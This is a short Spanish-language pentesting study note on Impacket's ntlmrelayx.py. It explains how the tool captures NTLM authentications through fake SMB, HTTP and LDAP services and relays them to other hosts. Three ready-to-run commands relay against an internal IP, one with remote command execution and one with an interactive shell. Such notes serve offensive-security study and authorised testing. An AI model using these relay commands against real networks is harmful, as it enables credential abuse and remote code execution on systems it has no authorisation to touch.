
---
- Tags: #Windows #Attacks #Hashes #Exploitation #Network
- ---
# Qué es? 

`ntlmrelayx.py` es una herramienta de **Impacket** que:

- Levanta **servicios falsos** (SMB / HTTP / LDAP)
- Recibe **autenticaciones NTLM**
- **Relaya esas credenciales en tiempo real** a otros servicios
- Ejecuta acciones **sin crackear contraseñas**

**Lo ocupamos cuando tenemos**:

- Responder envenenando LLMNR/NBT-NS
- MITM (ARP spoof o red abierta)

# Uso

Una vez que tenemos **[[Responder]]** corriendo y configurado:

```bash
ntlmrelayx.py -t smb://192.168.1.20 -smb2support
```

**Con ejecución de comando:**

```bash
ntlmrelayx.py -t smb://192.168.1.20 -c "whoami" -smb2support
```

**Con Shell interactiva**

```bash
ntlmrelayx.py -t smb://192.168.1.20 -i -smb2support

```